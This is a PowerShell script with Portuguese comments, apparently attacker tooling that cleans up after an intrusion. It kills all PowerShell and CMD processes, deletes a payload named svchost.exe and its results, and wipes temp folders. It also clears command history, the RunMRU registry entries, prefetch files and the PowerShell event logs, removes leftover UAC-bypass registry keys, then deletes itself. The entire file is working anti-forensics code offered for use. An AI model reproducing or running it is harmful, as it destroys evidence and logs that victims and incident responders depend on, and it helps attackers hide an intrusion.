<#
.SYNOPSIS
    Cleaner Master v3 – Mata TODOS os processos PowerShell/CMD,
    incluindo os de outras sessões (admin), remove rastros e se autodestrói.
    ATENÇÃO: Este script é suicida – ele também encerra a si mesmo no final.
#>

$tempDir   = $env:TEMP
$payload   = "svchost.exe"
$results   = "$tempDir\results"
$flag      = "$tempDir\END_ALL.txt"
$myPid     = $PID

# ===== FUNÇÃO MATADORA IMPIEDOSA =====
function Kill-All {
    param([string[]]$Names)
    foreach ($name in $Names) {
        # Método 1: Stop-Process normal (todos os processos com esse nome)
        Get-Process -Name $name -ErrorAction SilentlyContinue | ForEach-Object {
            Write-Host "[MATANDO] $($_.Name) PID $($_.Id)"
            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
        }
        Start-Sleep -Milliseconds 500

        # Método 2: taskkill /f para qualquer sobrevivente
        cmd /c "taskkill /f /im $name.exe /t 2>nul" | Out-Null
        Start-Sleep -Milliseconds 500

        # Método 3: WMI para matar até processos escondidos
        Get-WmiObject Win32_Process -Filter "Name='$name.exe'" | ForEach-Object {
            if ($_.ProcessId -ne $myPid) {
                Write-Host "[WMI MATANDO] $($_.Name) PID $($_.ProcessId)"
                $_.Terminate() | Out-Null
            }
        }
    }
}

# ===== 1. MATAR TODOS OS POWERSHELL E CMD (exceto o atual momentaneamente) =====
Write-Host "[CLEANER] Iniciando massacre..."
Kill-All -Names @("powershell", "cmd")

# Aguarda um pouco para os processos morrerem
Start-Sleep -Seconds 2

# ===== 2. REMOVER ARQUIVOS E PASTAS =====
Write-Host "[CLEANER] Deletando arquivos..."
$paths = @(
    "$tempDir\$payload",
    $results,
    $flag,
    "$tempDir\*.zip",
    "$tempDir\*.ps1",
    "$tempDir\*.exe",
    "$tempDir\*.txt",
    "$tempDir\*.csv",
    "$tempDir\*.json",
    "$env:LOCALAPPDATA\Temp\*",
    "$env:WINDIR\Temp\*"
)
foreach ($p in $paths) {
    if (Test-Path $p) {
        Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# ===== 3. LIMPAR HISTÓRICO E REGISTROS =====
Clear-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue

# ===== 4. REMOVER PREFETCH (se admin) =====
if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator')) {
    Remove-Item "$env:SystemRoot\Prefetch\*POWERSHELL*" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:SystemRoot\Prefetch\*CMD*" -Force -ErrorAction SilentlyContinue
}

# ===== 5. LIMPAR LOGS DE EVENTOS (se admin) =====
if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator')) {
    wevtutil cl "Windows PowerShell" 2>$null
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
}

# ===== 6. APAGAR CHAVES DO BYPASS UAC =====
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue

# ===== 7. AUTO-REMOÇÃO DO SCRIPT =====
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) { Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue }

# ===== 8. SUICÍDIO FINAL =====
Write-Host "[CLEANER] Missão cumprida. Adeus."
[GC]::Collect()
Start-Sleep -Seconds 1

# Mata o próprio processo e qualquer outro que tenha escapado
Stop-Process -Id $myPid -Force
# Se falhar, usa taskkill como última cartada
cmd /c "taskkill /f /pid $myPid /t 2>nul" | Out-Null
